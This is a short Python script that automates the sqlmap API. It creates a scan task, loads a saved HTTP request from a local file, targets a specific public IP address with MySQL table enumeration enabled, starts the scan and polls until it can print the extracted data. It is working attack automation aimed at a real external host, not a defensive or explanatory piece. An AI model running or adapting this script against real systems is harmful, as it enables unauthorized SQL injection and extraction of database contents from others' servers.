import requests,json

#创建任务ID
task_new_rul='http://127.0.0.1:8775/task/new'
resp = requests.get(task_new_rul)

task_id=resp.json()['taskid']
print(resp.json()['taskid'])


with open(r'C:\Users\yinqinghe\Desktop\2.txt','r') as f:
    file_c=f.read()
# print(file_c)
data = {
    'url':'http://124.70.109.142:82',
    'requestFile':file_c,
    # 'logFile':file_c,    
    'db':'test',
    'dbms':'MySql',
    'getTables':'Ture'
}
headers={
    'Content-Type':'application/json'
}
task_set_url = 'http://127.0.0.1:8775/option/'+task_id+'/set'
res=task_set_resp=requests.post(task_set_url,data=json.dumps(data),headers=headers)
print(res.text)
task_start_url = 'http://127.0.0.1:8775/scan/'+task_id+'/start'
task_start_resp=requests.post(task_start_url,data=json.dumps(data),headers=headers)

print(res.text)

if 'success' in task_start_resp.content.decode('utf-8'):
    print('sqlmapapi start success!')
    # task_status_url = 'http://127.0.0.1:8775/scan/' + task_id + '/status'
    # task_status_resp = requests.get(task_status_url)
    # print(task_status_resp.text)
    # task_data_url='http://127.0.0.1:8775/scan/' + task_id + '/data'
    # task_data_resp= requests.get(task_data_url)
    # print(task_data_resp.content.decode('utf-8'))
    while 1:
        task_status_url = 'http://127.0.0.1:8775/scan/' + task_id + '/status'
        task_status_resp = requests.get(task_status_url)
        if 'running' in task_status_resp.content.decode('utf-8'):
            print('sqlmapapi taskid scan running')
            pass
        else:
            task_data_url='http://127.0.0.1:8775/scan/' + task_id + '/data'
            task_data_resp= requests.get(task_data_url)
            print(task_data_resp.content.decode('utf-8'))
            break